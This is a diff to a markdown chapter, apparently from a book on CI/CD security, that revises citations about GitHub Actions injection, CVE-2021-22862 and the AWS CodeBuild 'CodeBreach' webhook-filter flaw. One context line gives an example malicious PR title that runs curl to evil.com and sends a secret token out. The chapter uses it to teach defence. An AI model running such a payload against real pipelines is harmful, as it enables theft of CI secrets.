@@ -175,7 +175,7 @@ GitHub Actions workflows can be vulnerable to code injection through expression 
 
 If a PR title contains shell metacharacters or command injection payloads, they may be executed. An attacker could craft a PR with title `` `curl http://evil.com/steal?token=$SECRET` `` and achieve command execution.
 
-**Example**: In 2021, [security researcher Teddy Katz disclosed CVE-2021-22862][cve-2021-22862], a vulnerability that allowed attackers to steal GitHub Actions secrets from forked repositories by manipulating pull request base references. The finding earned a $25,000 bug bounty and affected hundreds of repositories.
+**Example**: In 2021, security researcher Teddy Katz [disclosed CVE-2021-22862][teddy-actions], a vulnerability that allowed attackers to steal GitHub Actions secrets from forked repositories by manipulating pull request base references. The finding earned a $25,000 bug bounty and was patched on GitHub.com and in [GitHub Enterprise Server][cve-2021-22862].
 
 **Hardening Recommendations:**
 
@@ -189,7 +189,7 @@ If a PR title contains shell metacharacters or command injection payloads, they 
 
 Webhook filters are a common mechanism for constraining which events trigger privileged CI/CD builds — for example, allowing only pull requests from trusted maintainers to run builds with access to secrets. When these filters rely on pattern matching rather than exact identity verification, they introduce a subtle but critical vulnerability class.
 
-In January 2026, security researchers at Wiz disclosed what they termed the "CodeBreach" class of risk: a webhook filter misconfiguration in AWS CodeBuild affecting four AWS-managed open-source GitHub repositories, including `aws-sdk-js-v3`, `aws-lc`, `amazon-corretto-crypto-provider`, and `awslabs/open-data-registry`.[^codebreach-aws][^codebreach-wiz]
+In January 2026, security researchers at Wiz disclosed what they termed the "CodeBreach" class of risk: a webhook filter misconfiguration in AWS CodeBuild affecting four AWS-managed open-source GitHub repositories, including `aws-sdk-js-v3`, `aws-lc`, `amazon-corretto-crypto-provider`, and `awslabs/open-data-registry`.[^codebreach-aws] Wiz's write-up described how the missing regex anchors could allow a predictably acquired GitHub actor ID to bypass the filter.[^codebreach-wiz]
 
 **Root Cause — Unanchored Regex:**
 
@@ -230,8 +230,8 @@ AWS reported that researchers demonstrated the ability to commit code to one rep
 
 4. **Assume untrusted PRs will attempt to trigger privileged builds.** Implement explicit approval gates (comment-based or role-based) before running builds that have access to secrets, rather than relying solely on identity-based filtering.
 
-[^codebreach-aws]: AWS, "Security Bulletin 2026-002: AWS Open Source Repository Webhook Configuration," January 15, 2026, https://aws.amazon.com/security/security-bulletins/AWS-2026-002/.
-[^codebreach-wiz]: Wiz Research, "CodeBreach: Breaking Out of AWS CodeBuild via Webhook Filter Bypass," January 15, 2026, https://www.wiz.io/blog/codebreach-breaking-out-of-aws-codebuild-via-webhook-filter-bypass.
+[^codebreach-aws]: AWS, "Security Bulletin 2026-002: AWS Open Source Repository Webhook Configuration," January 15, 2026, https://aws.amazon.com/security/security-bulletins/2026-002-AWS/.
+[^codebreach-wiz]: Wiz Research, "CodeBreach: Supply Chain Vuln & AWS CodeBuild Misconfig," January 15, 2026, https://www.wiz.io/blog/wiz-research-codebreach-vulnerability-aws-codebuild.
 
 ## Dependency Caching Vulnerabilities
 
@@ -471,6 +471,7 @@ Book 2, Chapter 17 examines zero trust principles applied to CI/CD environments,
 [travis-ci-secrets]: https://edoverflow.com/2019/ci-knew-there-would-be-bugs-here/
 [cve-2022-24348]: https://nvd.nist.gov/vuln/detail/CVE-2022-24348
 [cve-2021-22862]: https://nvd.nist.gov/vuln/detail/CVE-2021-22862
+[teddy-actions]: https://blog.teddykatz.com/2021/03/17/github-actions-write-access.html
 [cycode-cache]: https://cycode.com/blog/github-actions-vulnerabilities/
 [praetorian-runners]: https://www.praetorian.com/blog/self-hosted-github-runners-are-backdoors/
 [cve-2022-36067]: https://nvd.nist.gov/vuln/detail/CVE-2022-36067
